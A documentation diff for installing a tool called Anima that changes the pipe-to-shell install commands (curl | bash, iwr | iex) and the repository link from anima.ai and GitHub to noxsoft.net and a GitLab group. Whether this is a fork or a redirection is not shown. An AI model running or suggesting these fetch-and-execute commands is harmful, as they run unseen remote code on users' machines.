@@ -34,12 +34,12 @@ The **installer script** is the recommended way to install Anima. It handles Nod
     <Tabs>
       <Tab title="macOS / Linux / WSL2">
         ```bash
-        curl -fsSL https://anima.ai/install.sh | bash
+        curl -fsSL https://noxsoft.net/install.sh | bash
         ```
       </Tab>
       <Tab title="Windows (PowerShell)">
         ```powershell
-        iwr -useb https://anima.ai/install.ps1 | iex
+        iwr -useb https://noxsoft.net/install.ps1 | iex
         ```
       </Tab>
     </Tabs>
@@ -51,12 +51,12 @@ The **installer script** is the recommended way to install Anima. It handles Nod
     <Tabs>
       <Tab title="macOS / Linux / WSL2">
         ```bash
-        curl -fsSL https://anima.ai/install.sh | bash -s -- --no-onboard
+        curl -fsSL https://noxsoft.net/install.sh | bash -s -- --no-onboard
         ```
       </Tab>
       <Tab title="Windows (PowerShell)">
         ```powershell
-        & ([scriptblock]::Create((iwr -useb https://anima.ai/install.ps1))) -NoOnboard
+        & ([scriptblock]::Create((iwr -useb https://noxsoft.net/install.ps1))) -NoOnboard
         ```
       </Tab>
     </Tabs>
@@ -105,10 +105,10 @@ The **installer script** is the recommended way to install Anima. It handles Nod
 
     <Steps>
       <Step title="Clone and build">
-        Clone the [Anima repo](https://github.com/anima/anima) and build:
+        Clone the [Anima repo](https://gitlab.com/sylys-group/anima) and build:
 
         ```bash
-        git clone https://github.com/anima/anima.git
+        git clone https://gitlab.com/sylys-group/anima.git
         cd anima
         pnpm install
         pnpm ui:build
